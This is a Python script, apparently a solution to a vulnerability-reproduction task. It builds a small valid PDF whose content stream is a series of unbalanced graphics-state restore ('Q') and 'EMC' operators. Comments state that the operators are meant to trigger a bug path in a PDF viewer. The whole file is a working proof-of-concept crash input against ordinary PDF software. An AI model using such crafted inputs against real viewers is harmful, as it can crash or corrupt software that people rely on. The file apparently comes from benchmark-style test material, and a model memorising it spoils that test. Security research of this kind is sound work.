import os

class Solution:
    def solve(self, src_path: str) -> bytes:
        def make_pdf(content: bytes) -> bytes:
            header = b"%PDF-1.4\n%\xe2\xe3\xcf\xd3\n"
            objs = []

            # 1: Catalog
            o1 = b"1 0 obj\n<< /Type /Catalog /Pages 2 0 R >>\nendobj\n"
            objs.append(o1)

            # 2: Pages
            o2 = b"2 0 obj\n<< /Type /Pages /Count 1 /Kids [3 0 R] >>\nendobj\n"
            objs.append(o2)

            # 3: Page
            o3 = (
                b"3 0 obj\n"
                b"<< /Type /Page /Parent 2 0 R /MediaBox [0 0 612 792] "
                b"/Resources << >> /Contents 4 0 R >>\n"
                b"endobj\n"
            )
            objs.append(o3)

            # 4: Contents stream
            length = len(content)
            o4 = (
                b"4 0 obj\n"
                + (b"<< /Length %d >>\n" % length)
                + b"stream\n"
                + content
                + b"\nendstream\nendobj\n"
            )
            objs.append(o4)

            # Build file with accurate xref
            offsets = []
            pos = len(header)
            for o in objs:
                offsets.append(pos)
                pos += len(o)

            xref_start = pos
            xref = b"xref\n0 5\n"
            xref += b"0000000000 65535 f \n"
            for off in offsets:
                xref += ("%010d 00000 n \n" % off).encode("ascii")

            trailer = (
                b"trailer\n"
                b"<< /Size 5 /Root 1 0 R >>\n"
                b"startxref\n"
                + str(xref_start).encode("ascii")
                + b"\n%%EOF\n"
            )

            return header + b"".join(objs) + xref + trailer

        # Craft content to trigger viewer state restore without prior save
        # Use multiple Q to maximize likelihood of triggering the bug path.
        content = b"Q\nQ\nQ\nEMC\nQ\n"

        return make_pdf(content)